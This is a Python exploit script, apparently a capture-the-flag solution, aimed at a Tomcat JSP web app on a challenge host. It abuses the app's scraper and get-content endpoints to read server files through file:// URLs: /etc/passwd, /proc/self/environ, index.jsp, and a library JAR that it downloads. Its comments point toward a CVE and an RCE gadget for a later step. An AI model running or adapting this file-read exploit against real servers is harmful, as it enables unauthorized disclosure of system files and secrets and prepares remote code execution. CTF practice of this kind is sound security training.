import httpx
import asyncio
import re, base64

URL = "http://1pc.tf:56744/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)

class API(BaseAPI):
    async def scraper_handler(self, website_url="https://google.com", scraping_type="html", include_images=True, include_links=True):
        """
        Call the scraper-handler.jsp endpoint with specified parameters
        """
        # Build query parameters
        params = {
            'websiteUrl': website_url,
            'scrapingType': scraping_type,
            'includeImages': include_images,
            'includeLinks': include_links
        }
        
        # Make request to scraper endpoint
        response = await self.c.post("/scraper-handler.jsp", data=params)
        return response
    
    async def get_content(self, url="file:///etc/passwd"):
        """
        Call the get-content.jsp endpoint with specified URL parameter
        """
        params = {
            'url': url
        }
        
        # Make request to get-content endpoint
        response = await self.c.get("/get-content.jsp", params=params)
        return response
    
    async def file_read(self, file_path="file:///etc/passwd"):
        """
        Read the content of a file
        """
        scraping_type = "html"
        include_images = True
        include_links = True
        await self.scraper_handler(website_url=file_path, scraping_type=scraping_type, include_images=include_images, include_links=include_links)
        result = await self.get_content(url=file_path)
        result = base64.b64decode(result.text)
        return result
    
async def main():
    api = API()

    # check what application is used
    result = await api.file_read(file_path="file:///proc/self/cmdline")
    print("Application used:")
    print(result)

    # check tomcat version, actually it's vulnerable to CVE
    result = await api.file_read(file_path="file:///proc/self/environ")
    print("Tomcat version:")
    print(re.search(r"TOMCAT_VERSION=(\d+\.\d+\.\d+)", result.decode()).group(1))

    # check index.jsp, we will know that the aplication try to load strange jar file
    result = await api.file_read(file_path="file:///usr/local/tomcat/webapps/ROOT/index.jsp")
    print("Index.jsp:")
    print(result.decode())

    # check demo-1.0-SNAPSHOT.jar
    result = await api.file_read(file_path="file:///usr/local/tomcat/lib/demo-1.0-SNAPSHOT.jar")
    print("Demo-1.0-SNAPSHOT.jar:")
    with open("demo-1.0-SNAPSHOT.jar", "wb") as f:
        f.write(result)
    print("Downloaded demo-1.0-SNAPSHOT.jar")

    # decompile that and u will see the gadget in the library, it's a RCE gadget

    
if __name__ == "__main__":
    asyncio.run(main())
